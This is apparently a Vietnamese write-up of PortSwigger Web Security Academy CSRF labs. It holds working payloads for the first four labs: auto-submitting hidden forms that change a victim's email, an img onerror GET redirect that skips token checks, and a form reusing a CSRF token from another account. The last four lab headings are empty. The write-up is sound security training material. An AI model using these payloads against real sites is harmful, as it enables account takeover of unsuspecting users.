# 1. CSRF vulnerability with no defenses
Vào exploit server, cấu hình đoạn HTML sau:

```
<form id="form" method="POST" action="https://0afb00eb04d9b8bec0d9405a00290069.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="attacker2@email.com">
</form>

<script>form.submit()</script>
```
Sau khi click "Deliver to victim", bài lab được giải thành công.

# 2. CSRF where token validation depends on request method
Request thay đổi email là `POST /my-account/change-email` với hai tham số `email` và `csrf`. Tuy nhiên nhận thấy nếu ta thay đổi request thành `GET /my-account/change-email?email=attacker%40gmail.com`, cho dù không có tham số `csrf` thì email vẫn bị thay đổi thành công

Vào exploit server cấu hình đoạn XML sau:

```
<img src=1 onerror="document.location='https://0a06005e03421b53c1c14436007600ad.web-security-academy.net/my-account/change-email?email=attacker@gmail.com'">
```
Sau khi click "Deliver to victim", bài lab được giải thành công.

# 3. CSRF where token validation depends on token being present
Ta thấy khi trong request không có tham số `csrf`, email vẫn bị thay đổi. Như vậy ta vào exploit server và cấu hình đoạn HTML:

```
<form method="POST" action="https://0a35003f047cea06c1019ee1003c006c.web-security-academy.net/my-account/change-email" id="form">
<input type="hidden" name="email" value="attacker@gmail.com">
</form>

<script>form.submit()</script>
```
Sau khi click "Deliver to victim", bài lab được giải thành công.

# 4. CSRF where token is not tied to user session
Đăng nhập vào tài khoản wiener:peter rồi vào trang "My account", lưu lại csrf token. Sau đó logout rồi đăng nhập vào tài khoản carlos:montoya, dùng session của carlos và csrf token đã lưu của wiener để submit một request `POST /my-account/change-email`. Kết quả email bị thay đổi. Như vậy giữa csrf và session không có mối liên hệ với nhau. Với một csrf token chưa được sử dụng, ta có thể submit với bất kỳ session nào.

Ta đăng nhập lại tài khoản wiener:peter, lưu lại csrf token là `w9lcvACTQ0fT30znoZiPT42ILgGHkFnF`, sau đó và exploit server để cấu hình đoạn HTML sau:

```
<form id="form" method="POST" action="https://0a1a008e03260d9ac1a3879500b300b3.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="attacker@gmail.com">
<input type="hidden" name="csrf" value="w9lcvACTQ0fT30znoZiPT42ILgGHkFnF">
</form>

<script>form.submit();</script>
```

Sau khi click "Deliver to victim", bài lab được giải thành công.

# 5. CSRF where token is tied to non-session cookie

# 6. CSRF where token is duplicated in cookie

# 7. CSRF where Referer validation depends on header being present

# 8. CSRF with broken Referer validation
